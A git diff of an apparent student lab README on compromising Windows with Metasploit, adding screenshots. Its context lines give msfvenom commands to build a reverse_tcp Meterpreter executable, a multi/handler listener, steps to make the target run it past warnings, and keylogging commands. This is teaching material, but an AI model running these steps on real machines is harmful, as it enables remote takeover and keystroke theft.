@@ -3,8 +3,6 @@ Compromising windows using Metasploit
 # Metasploit
 Compromising windows using Metasploit
 
-### Developed By
-
 # AIM:
 
 To Compromise windows using Metasploit .
@@ -63,11 +61,13 @@ Find the attackers ip address using ifconfig
 
 ### Output:
 
+<img width="814" height="352" alt="image" src="https://github.com/user-attachments/assets/b01fd653-7d28-4586-9225-356c8ed9e9ac" />
 
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
 ### Output:
+<img width="809" height="470" alt="image" src="https://github.com/user-attachments/assets/3bc95fb6-e2d8-49d6-bb10-afc2847386ee" />
 
 
 
@@ -89,6 +89,7 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="803" height="647" alt="image" src="https://github.com/user-attachments/assets/745acb96-9c7f-411d-b8b5-c205572ea804" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
@@ -98,6 +99,7 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
 
+<img width="1081" height="715" alt="image" src="https://github.com/user-attachments/assets/59e73bb3-63cf-4831-a581-c00d51294e2e" />
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
@@ -113,6 +115,7 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 keyscan_dump Shows the keystrokes captured so far
 
+<img width="622" height="207" alt="image" src="https://github.com/user-attachments/assets/2a905c0c-bf47-4e2a-8c27-39a6f8861694" />
 
 
 ## RESULT:
